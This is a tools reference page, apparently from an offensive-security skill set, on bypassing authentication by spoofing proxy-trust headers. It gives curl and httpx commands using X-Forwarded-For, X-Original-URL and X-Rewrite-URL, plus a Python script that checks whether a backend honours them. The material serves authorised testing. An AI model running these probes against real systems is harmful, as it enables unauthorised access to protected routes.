# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`authentication-bypass-header-and-proxy-trust`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -si https://target.example/internal -H 'X-Forwarded-For: 127.0.0.1'` | Test whether a spoofed loopback address flips an internal route to success | Cross-platform |
| `curl` | `curl -si https://target.example/ -H 'X-Original-URL: /admin'` | Test whether the origin authorises on the override header rather than the request line | Cross-platform |
| `Burp Param Miner` | `Run 'Guess headers' against the protected route` | Discover which hidden trust headers the stack actually honours | Cross-platform |
| `httpx` | `httpx -u https://target.example/admin -H 'X-Rewrite-URL: /admin' -sc` | Batch-check rewrite-header acceptance and status across routes | Cross-platform |

## Minimal Script Shape

A trust-header differential: it requests an internal route clean and with spoofed proxy-trust headers, then reports whether the backend honoured a header the edge should have stripped.

```python
import urllib.error
import urllib.request

ROUTE = "https://target.example/internal/metrics"

def status(headers):
    req = urllib.request.Request(ROUTE, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code

plain = status({})
spoofed = status({"X-Forwarded-For": "127.0.0.1",
                  "X-Original-URL": "/internal/metrics"})
print({"plain": plain, "spoofed_headers": spoofed,
       "header_trusted": plain in (401, 403, 404) and spoofed == 200})
```
